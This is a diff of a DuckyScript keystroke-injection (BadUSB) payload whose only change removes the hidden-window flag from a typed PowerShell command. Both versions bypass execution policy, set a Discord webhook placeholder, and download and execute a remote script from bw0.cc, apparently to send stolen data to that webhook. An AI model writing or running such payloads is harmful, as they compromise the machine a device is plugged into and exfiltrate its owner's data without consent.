@@ -11,7 +11,7 @@ REM open powershell (remove "-W H" to show the window)
 DELAY 1000
 GUI r
 DELAY 750
-STRING powershell -Ep Bypass -W H -C $dc = 'YOUR_WEBHOOK_HERE' ; iex (irm bw0.cc/dcsp)
+STRING powershell -Ep Bypass -C $dc = 'YOUR_WEBHOOK_HERE' ; iex (irm bw0.cc/dcsp)
 ENTER
 
 
